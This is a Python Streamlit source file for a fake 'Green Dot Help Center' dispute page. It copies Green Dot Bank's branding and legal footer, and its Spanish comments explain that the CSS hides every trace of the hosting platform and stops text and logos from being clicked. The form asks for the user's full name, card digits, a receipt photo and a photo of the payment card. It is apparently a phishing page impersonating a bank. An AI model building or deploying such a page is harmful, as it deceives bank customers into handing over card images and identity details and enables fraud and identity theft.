
import streamlit as st
import sqlite3
import os
from datetime import datetime

# DB Setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# CSS AGRESIVO PARA ELIMINAR ANCLAS Y BRANDING
st.markdown("""<style>
/* Ocultar cabecera, pie de página y menú de Streamlit */
[data-testid='stHeader'], [data-testid='stFooterAd'], footer, header, #MainMenu, .stDeployButton {
    display: none !important;
    visibility: hidden !important;
}

/* ELIMINAR EL ICONO DE ENLACE (ANCLA) JUNTO A LOS TÍTULOS */
.viewerBadge_container__1QS13, .stApp a.section-anchor, .section-anchor {
    display: none !important;
    visibility: hidden !important;
}

/* Desactivar clics en textos y logos para evitar que actúen como botones */
h1, h2, h3, p, [data-testid="stImage"] {
    pointer-events: none !important;
    user-select: none !important;
}

/* Fondo negro y texto blanco */
.stApp {
    background-color: #000000 !important;
    color: #FFFFFF !important;
}

/* Botón verde esmeralda personalizado */
.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    border: none !important;
    width: 100%;
    padding: 15px !important;
    font-weight: bold !important;
    text-transform: uppercase;
}

/* Estilo de los campos de entrada */
input {
    background-color: #111 !important;
    color: white !important;
    border: 1px solid #333 !important;
}

.legal-footer {
    font-size: 10px;
    color: #444;
    text-align: justify;
    margin-top: 60px;
    border-top: 1px solid #222;
    padding-top: 20px;
}
</style>""", unsafe_allow_html=True)

if os.path.exists('logo.svg'):
    st.image('logo.svg', width=120)

st.title("Help Center")
st.write("Submit your transaction dispute below.")

with st.form("dispute_form", clear_on_submit=True):
    nombre = st.text_input("Full Name")
    cuenta = st.text_input("Last 4 digits of Card")
    monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
    st.markdown("**Upload Evidence**")
    rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
    car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
    submitted = st.form_submit_button("SUBMIT NOW")

if submitted:
    if nombre and rec and car:
        st.success("✅ Claim received. We will review it shortly.")
    else:
        st.error("⚠️ All fields are required.")

st.markdown("""<div class='legal-footer'>
Green Dot cards are issued by Green Dot Bank, Member FDIC. ©2026 Green Dot Bank. 
All rights reserved. The Green Dot logo is a registered trademark.
</div>""", unsafe_allow_html=True)
